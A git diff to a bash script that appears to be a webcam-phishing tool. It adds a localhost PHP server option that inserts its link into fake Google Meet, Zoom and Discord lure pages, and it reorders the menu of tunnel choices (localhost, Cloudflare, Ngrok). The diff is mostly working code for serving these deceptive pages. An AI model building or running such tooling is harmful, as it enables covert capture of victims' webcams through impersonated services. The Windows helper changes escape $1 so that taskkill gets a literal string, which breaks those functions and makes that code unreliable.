@@ -12,16 +12,16 @@ if [[ "$(uname -a)" == *"MINGW"* ]] || [[ "$(uname -a)" == *"MSYS"* ]] || [[ "$(
   
   # Define Windows-specific command replacements
   function killall() {
-    taskkill /F /IM "$1" 2>/dev/null
+    taskkill /F /IM "\$1" 2>/dev/null
   }
   
   function pkill() {
-    if [[ "$1" == "-f" ]]; then
+    if [[ "\$1" == "-f" ]]; then
       shift
       shift
-      taskkill /F /FI "IMAGENAME eq $1" 2>/dev/null
+      taskkill /F /FI "IMAGENAME eq \$1" 2>/dev/null
     else
-      taskkill /F /IM "$1" 2>/dev/null
+      taskkill /F /IM "\$1" 2>/dev/null
     fi
   }
 else
@@ -456,14 +456,44 @@ fi
 rm -rf index3.html
 }
 
+# Function to serve files from localhost
+localhost_server() {
+  printf "\e[1;92m[\e[0m+\e[1;92m] Starting PHP server on localhost...\n"
+  php -S 127.0.0.1:3333 > /dev/null 2>&1 &
+  sleep 2
+
+  local link="http://127.0.0.1:3333"
+  printf "\e[1;92m[\e[0m*\e[1;92m] Direct link:\e[0m\e[1;77m %s\e[0m\n" "$link"
+
+  payload_localhost "$link"
+  checkfound
+}
+
+payload_localhost() {
+  local link="$1"
+  sed 's+forwarding_link+'"$link"'+g' template.php > index.php
+  if [[ $option_tem -eq 1 ]]; then
+    sed 's+forwarding_link+'"$link"'+g' googlemeet.html > index3.html
+    sed 's+fes_name+'"$fest_name"'+g' index3.html > index2.html
+  elif [[ $option_tem -eq 2 ]]; then
+    sed 's+forwarding_link+'"$link"'+g' zoom.html > index3.html
+    sed 's+live_yt_tv+'"$yt_video_ID"'+g' index3.html > index2.html
+  else
+    sed 's+forwarding_link+'"$link"'+g' discord.html > index2.html
+  fi
+  rm -rf index3.html
+}
+
+
 rendercam() {
 if [[ -e sendlink ]]; then
 rm -rf sendlink
 fi
 
-printf "\n-----Choose tunnel server----\n"    
-printf "\n\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Ngrok\e[0m\n"
+printf "\n-----Choose tunnel server----\n"
+printf "\n\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Localhost\e[0m\n"
 printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m CloudFlare Tunnel\e[0m\n"
+printf "\e[1;92m[\e[0m\e[1;77m03\e[0m\e[1;92m]\e[0m\e[1;93m Ngrok\e[0m\n"
 default_option_server="1"
 read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose a Port Forwarding option: [Default is 1] \e[0m' option_server
 option_server="${option_server:-${default_option_server}}"
@@ -471,8 +501,10 @@ select_template
 
 if [[ $option_server -eq 2 ]]; then
 cloudflare_tunnel
-elif [[ $option_server -eq 1 ]]; then
+elif [[ $option_server -eq 3 ]]; then
 ngrok_server
+elif [[ $option_server -eq 1 ]]; then
+  localhost_server
 else
 printf "\e[1;93m [!] Invalid option!\e[0m\n"
 sleep 1
@@ -482,7 +514,7 @@ fi
 }
 
 select_template() {
-if [ $option_server -gt 2 ] || [ $option_server -lt 1 ]; then
+if [ $option_server -gt 3 ] || [ $option_server -lt 1 ]; then
 printf "\e[1;93m [!] Invalid tunnel option! try again\e[0m\n"
 sleep 1
 clear
